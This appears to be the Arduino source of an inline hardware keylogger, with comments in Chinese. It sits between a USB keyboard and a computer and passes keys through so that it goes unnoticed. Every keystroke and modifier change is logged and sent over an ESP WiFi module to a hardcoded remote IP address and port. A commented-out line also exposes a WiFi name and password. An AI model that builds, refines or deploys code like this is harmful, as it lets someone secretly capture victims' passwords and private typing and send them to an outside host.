#include <hidboot.h>
#include <usbhub.h>
#include <Keyboard.h>
//#include <SoftwareSerial.h>

//SoftwareSerial Serial1(10, 11); // RX, TX

/*
 * usb host识别按键信息再通过esp发送，esp使用Serial1
 * 供电上可能有些问题，esp要外接电源
 * 如果是可输出ASCII字符，直接输出字符，否则输出[十六进制值]
 * ctrl alt gui为字符串提示
*/

// Satisfy the IDE, which needs to see the include statment in the ino too.
#ifdef dobogusinclude
#include <spi4teensy3.h>
#include <SPI.h>
#endif

bool LCStatus = false;
bool LSStatus = false;
bool LAStatus = false;
bool LGStatus = false;
bool RCStatus = false;
bool RSStatus = false;
bool RAStatus = false;
bool RGStatus = false;
String STR = "";

void SendOut()
{
  //Serial.println(STR.length());
  Serial1.println("AT+CIPSEND="+String(STR.length()));
  delay(100);
  Serial1.println(STR);
  STR = "";
}

class KbdRptParser : public KeyboardReportParser
{
    void PrintKey(uint8_t mod, uint8_t key);

  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);

    void OnKeyDown	(uint8_t mod, uint8_t key);
    void OnKeyUp	(uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);
};

void KbdRptParser::PrintKey(uint8_t m, uint8_t key)
{
  MODIFIERKEYS mod;
  *((uint8_t*)&mod) = m;
  /*
  Serial.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
  Serial.print((mod.bmLeftShift  == 1) ? "S" : " ");
  Serial.print((mod.bmLeftAlt    == 1) ? "A" : " ");
  Serial.print((mod.bmLeftGUI    == 1) ? "G" : " ");
  */
  
  char temp[5];
  //Serial1.print("[");
  STR += "[";
  //PrintHex<uint8_t>(key, 0x80);
  //Serial1.print(key,HEX);
  sprintf(temp,"%#x",key);
  STR += String(temp);
  //Serial1.println("]");
  STR += "]";
  SendOut();
  //Serial.print(key+136,HEX);
  //Keyboard.write(key+136);

  /*
  Serial.print((mod.bmRightCtrl   == 1) ? "C" : " ");
  Serial.print((mod.bmRightShift  == 1) ? "S" : " ");
  Serial.print((mod.bmRightAlt    == 1) ? "A" : " ");
  Serial.println((mod.bmRightGUI    == 1) ? "G" : " ");
  */
};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
{
  //Serial1.print("D ");
  STR += "D ";
  Keyboard.press(key+136);
  uint8_t c = OemToAscii(mod, key);

  if (c)
    OnKeyPressed(c);
  else
    PrintKey(mod, key);
  
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {

  MODIFIERKEYS beforeMod;
  *((uint8_t*)&beforeMod) = before;

  MODIFIERKEYS afterMod;
  *((uint8_t*)&afterMod) = after;

  if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
    LCStatus = !LCStatus;
    if(LCStatus){
      Keyboard.press(KEY_LEFT_CTRL);
      //Serial1.println("LeftCtrl pressed");
      STR = "LeftCtrl pressed";
    }
    else
    {
      Keyboard.release(KEY_LEFT_CTRL);
      //Serial1.println("LeftCtrl released");
      STR = "LeftCtrl released";
    }
  }
  if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
    LSStatus = !LSStatus;
    if(LSStatus){
      Keyboard.press(KEY_LEFT_SHIFT);
      //Serial1.println("LeftShift pressed");
      STR = "LeftShift pressed";
    }
    else
    {
      Keyboard.release(KEY_LEFT_SHIFT);
      //Serial1.println("LeftShift released");
      STR = "LeftShift released";
    }
  }
  if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
    LAStatus = !LAStatus;
    if(LAStatus){
      Keyboard.press(KEY_LEFT_ALT);
      //Serial1.println("LeftAlt pressed");
      STR = "LeftAlt pressed";
    }
    else
    {
      Keyboard.release(KEY_LEFT_ALT);
      //Serial1.println("LeftAlt released");
      STR = "LeftAlt released";
    }
  }
  if (beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
    LGStatus = !LGStatus;
    if(LGStatus){
      Keyboard.press(KEY_LEFT_GUI);
      //Serial1.println("LeftGui pressed");
      STR = "LeftGui pressed";
    }
    else
    {
      Keyboard.release(KEY_LEFT_GUI);
      //Serial1.println("LeftGui released");
      STR = "LeftGui released";
    }
  }

  if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
    RCStatus = !RCStatus;
    if(RCStatus){
      Keyboard.press(KEY_RIGHT_CTRL);
      //Serial1.println("RightCtrl pressed");
      STR = "RightCtrl pressed";
    }
    else
    {
      Keyboard.release(KEY_RIGHT_CTRL);
      //Serial1.println("RightCtrl released");
      STR = "RightCtrl released";
    }
  }
  if (beforeMod.bmRightShift != afterMod.bmRightShift) {
    RSStatus = !RSStatus;
    if(RSStatus){
      Keyboard.press(KEY_RIGHT_SHIFT);
      //Serial1.println("RightShift pressed");
      STR = "RightShift pressed";
    }
    else
    {
      Keyboard.release(KEY_RIGHT_SHIFT);
      //Serial1.println("RightShift released");
      STR = "RightShift released";
    }
  }
  if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
    RAStatus = !RAStatus;
    if(RAStatus){
      Keyboard.press(KEY_RIGHT_ALT);
      //Serial1.println("RightAlt pressed");
      STR = "RightAlt pressed";
    }
    else
    {
      Keyboard.release(KEY_RIGHT_ALT);
      //Serial1.println("RightAlt released");
      STR = "RightAlt released";
    }
  }
  if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
    RGStatus = !RGStatus;
    if(RGStatus){
      Keyboard.press(KEY_RIGHT_GUI);
      //Serial1.println("RightGui pressed");
      STR = "RightGui pressed";
    }
    else
    {
      Keyboard.release(KEY_RIGHT_GUI);
      //Serial1.println("RightGui released");
      STR = "RightGui released";
    }
  }
  SendOut();
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)
{
  //Serial1.print("U ");
  STR += "U ";
  //PrintKey(mod, key);
  Keyboard.release(key+136);
  uint8_t c = OemToAscii(mod, key);

  if (c)
    OnKeyPressed(c);
  else
    PrintKey(mod, key);
}

void KbdRptParser::OnKeyPressed(uint8_t key)
{
  //Serial.print("ASCII: ");
  //Serial1.println((char)key);
  STR += (char)key;
  SendOut();
}

USB     Usb;
//USBHub     Hub(&Usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);

uint32_t next_time;

KbdRptParser Prs;

void setup()
{
  Serial1.begin( 115200 );
  //Serial.begin(115200);
/*
#if !defined(__MIPSEL__)
  while (!Serial); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
#endif
*/
  //Serial1.println("AT+CWJAP=\"Algorithm is Art\",\"maybe000\"");
  //delay(100);
  //Serial1.println("AT+RST");
  delay(1000);
  Serial1.println("AT+CWJAP?");
  delay(100);
  while(Serial1.available()>0)
  {
    STR += (char)Serial1.read();
    delay(10);
    }
  //Serial.println(STR);
  Serial1.println("AT+CIPSTART=\"TCP\",\"182.148.156.50\",2300");
  delay(300);
  //Serial1.println("Start");xl
  STR = "Start";
  SendOut();
  //Serial.println("test");

  if (Usb.Init() == -1){
    //Serial.println("OSC did not start.");
    STR = "OSC did not start.";
    SendOut();
  }
  
  delay( 200 );

  next_time = millis() + 5000;

  HidKeyboard.SetReportParser(0, &Prs);
  Keyboard.begin();
  //Serial.println("begin");
}

void loop()
{
  Usb.Task();
}

